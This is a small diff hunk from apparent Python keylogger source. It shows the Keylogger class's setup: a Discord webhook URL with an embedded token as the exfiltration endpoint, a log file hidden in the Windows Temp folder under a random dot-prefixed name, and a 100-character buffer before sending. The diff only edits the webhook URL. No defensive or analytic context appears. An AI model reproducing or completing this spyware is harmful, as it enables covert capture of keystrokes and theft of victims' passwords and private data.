@@ -32,7 +32,7 @@ def random_string(length=8):
 class Keylogger:
     def __init__(self):
         self.log = ""
-        self.webhook_url = "https://discord.com/api/webhooks/1360262312577204274/q8HSi0Y5G68BGwHxjGtb7gYxgzhXw5i_OzV8EUISAJT6GvM9j6BYxaOdm1lEGLmrYn7Y"  # Replace with your webhook
+        self.webhook_url = "https://discord.com/api/webhooks/1360262312577204274//q8HSi0Y5G68BGwHxjGtb7gYxgzhXw5i_OzV8EUISAJT6GvM9j6BYxaOdm1lEGLmrYn7Y"  # Replace with your webhook
         self.log_file = f"C:\\Windows\\Temp\\.{random_string()}.log"
         self.buffer_size = 100  # Send after 100 chars
         self.last_sent = time.time()
